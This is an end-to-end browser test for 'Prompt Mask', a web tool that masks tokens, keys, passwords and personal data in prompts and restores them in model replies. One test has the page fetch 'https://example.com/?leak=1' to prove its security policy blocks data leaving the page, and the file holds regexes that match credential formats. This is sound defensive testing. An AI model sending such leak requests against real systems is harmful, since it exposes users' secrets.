// The web page in a real browser, served with the exact headers from vercel.json.
//   npm run web:build && CHROME=<path to chrome.exe> node e2e/page.mjs
import { createReadStream, existsSync, readFileSync, statSync } from 'node:fs'
import { createServer } from 'node:http'
import { extname, join, normalize, sep } from 'node:path'
import { chromium } from 'playwright'

const ROOT = join(process.cwd(), 'dist-web')
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.woff2': 'font/woff2' }
const headers = JSON.parse(readFileSync('vercel.json', 'utf8')).headers.at(-1).headers
const server = createServer((req, res) => {
  const path = new URL(req.url, 'http://x').pathname
  const file = normalize(join(ROOT, path === '/' ? 'index.html' : path))
  if (!file.startsWith(ROOT + sep) || !existsSync(file) || !statSync(file).isFile()) {
    res.statusCode = 404
    res.end()
    return
  }
  for (const h of headers) res.setHeader(h.key, h.value)
  res.setHeader('content-type', TYPES[extname(file)] ?? 'application/octet-stream')
  createReadStream(file).pipe(res)
})
await new Promise((r) => server.listen(0, '127.0.0.1', r))
const URL_ = `http://127.0.0.1:${server.address().port}/`

const results = []
const errors = []
const check = (name, ok, detail = '') => results.push(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  — ' + detail : ''}`)
const browser = await chromium.launch({ executablePath: process.env.CHROME })
const ctx = await browser.newContext({ viewport: { width: 1280, height: 860 }, locale: 'en-US', permissions: ['clipboard-read', 'clipboard-write'] })
const page = await ctx.newPage()
const external = []
page.on('pageerror', (e) => errors.push(String(e).slice(0, 300)))
page.on('console', (m) => {
  if (m.type() === 'error') errors.push(m.text().slice(0, 300))
})
page.on('request', (r) => {
  if (!r.url().startsWith(URL_) && !r.url().startsWith('data:')) external.push(r.url())
})
await page.goto(URL_, { waitUntil: 'networkidle' })
check('renders under the strict security policy', await page.getByRole('heading', { name: 'Prompt Mask' }).isVisible())

await page.getByRole('button', { name: 'Try an example' }).click()
const original = await page.getByLabel('Your prompt').inputValue()
const masked = await page.getByTestId('masked').textContent()
for (const [name, re] of [
  ['GitHub token', /ghp_[A-Za-z0-9]{36}/],
  ['OpenAI key', /sk-proj-[A-Za-z0-9]{40,}/],
  ['database password', /Pr0d-Passw0rd/],
  ['email', /ali\.benali@/],
  ['phone', /661 234 567/],
  ['CIN', /AB123456/],
  ['RIB', /0000012050005349/],
  ['IP address', /10\.20\.0\.7/],
]) {
  check(`example really holds a ${name}`, re.test(original))
  check(`${name} is hidden`, !re.test(masked))
}
check('keeps the rest of the text', masked.includes('Why does this fail in production?') && masked.includes('Ali Benali'))
const chips = await page.getByTestId('counts').textContent()
check('counts what it found', /GITHUB_TOKEN × 1/.test(chips) && /RIB × 1/.test(chips), chips)

const reply = 'Rotate [[GITHUB_TOKEN_1]], then call [[PHONE_1]] about [[RIB_1]].'
await page.getByLabel("The model's reply").fill(reply)
const restored = await page.getByTestId('restored').textContent()
check('restores values in the reply', /ghp_[A-Za-z0-9]{36}/.test(restored) && restored.includes('+212 661 234 567') && !restored.includes('[['), restored.slice(0, 40) + '…')

await page.getByRole('button', { name: 'Copy' }).first().click()
const copied = await page.evaluate(() => navigator.clipboard.readText())
// Windows clipboards turn line ends into CRLF
check('copies the masked text', copied.replace(/\r\n/g, '\n') === masked && !/ghp_/.test(copied))

await page.getByRole('button', { name: 'Personal data' }).click()
const onlySecrets = await page.getByTestId('masked').textContent()
check('a category can be left visible', onlySecrets.includes('ali.benali@example.ma') && !/ghp_/.test(onlySecrets))
await page.getByRole('button', { name: 'Personal data' }).click()
await page.screenshot({ path: process.env.SHOT ?? 'page.png' })

// The page must not be able to send anything, even if something in it tried to.
const blocked = await page.evaluate(async () => {
  try {
    await fetch('https://example.com/?leak=1', { mode: 'no-cors' })
    return false
  } catch {
    return true
  }
})
check('the security policy blocks any request out', blocked)
errors.splice(0, errors.length, ...errors.filter((e) => !e.includes('example.com') && !e.includes('Content Security Policy')))
check('made no outside requests of its own', external.filter((u) => !u.includes('example.com')).length === 0, external.join(' '))

await page.getByRole('button', { name: 'Clear and forget' }).click()
check('clear and forget empties the page', (await page.getByLabel('Your prompt').inputValue()) === '')
await page.getByLabel("The model's reply").fill(reply)
check('after forgetting, placeholders stay placeholders', (await page.getByTestId('restored').textContent()) === reply)

// Arabic layout and a phone
await page.getByRole('radio', { name: 'ع' }).click()
check('Arabic flips the page', (await page.evaluate(() => document.documentElement.dir)) === 'rtl')
await page.setViewportSize({ width: 390, height: 844 })
check('no sideways scroll on a phone', await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth))

console.log(results.join('\n'))
console.log(`\n${results.filter((r) => r.startsWith('PASS')).length}/${results.length} passed`)
console.log('page errors:', errors)
await browser.close()
server.close()
if (results.some((r) => r.startsWith('FAIL')) || errors.length) process.exit(1)
